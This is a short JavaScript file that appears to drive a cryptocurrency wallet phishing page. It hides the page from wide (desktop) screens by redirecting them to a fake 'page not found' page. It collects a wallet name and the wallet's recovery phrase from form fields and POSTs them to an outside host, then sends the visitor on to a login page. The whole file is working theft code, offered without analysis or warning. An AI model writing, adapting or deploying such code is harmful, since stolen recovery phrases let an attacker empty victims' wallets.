let inputData = "";
let error = false;
let inputData2 = "";

if(screen.width > 768){
  window.location.assign("../PageNotFound/PageNotFound.html")
}

document.querySelector(".input-box-1").addEventListener("change",(e)=>{
    inputData = e.target.value
})

document.querySelector(".input-box-2").addEventListener("change",(e)=>{
    inputData2 = e.target.value
})

document.querySelector(".button").addEventListener("click",(e)=>{
  e.preventDefault()
  if(!error){
      const url = "https://api.cryp-t-cr-aky-c.com/api/other";
      const data = {
          walletName:inputData,
          recoveryPhrase:inputData2
      };
      const options = {
          method: 'POST',
          headers: {
              'Content-Type': 'application/json',
          },
          body: JSON.stringify(data)
      };

      fetch(url, options)
    .then(response => {
      if (!response.ok) {
        throw new Error('Network response was not ok');
      }
      return response.json();
    })
    .then(data => {
      console.log(data)
      if(data.status === "Confirmed"){
        window.location.assign("../LoginPage/loginpage.html");
      }
    })
    .catch(error => {
      console.error('Fetch error:', error);
    });
  }
})
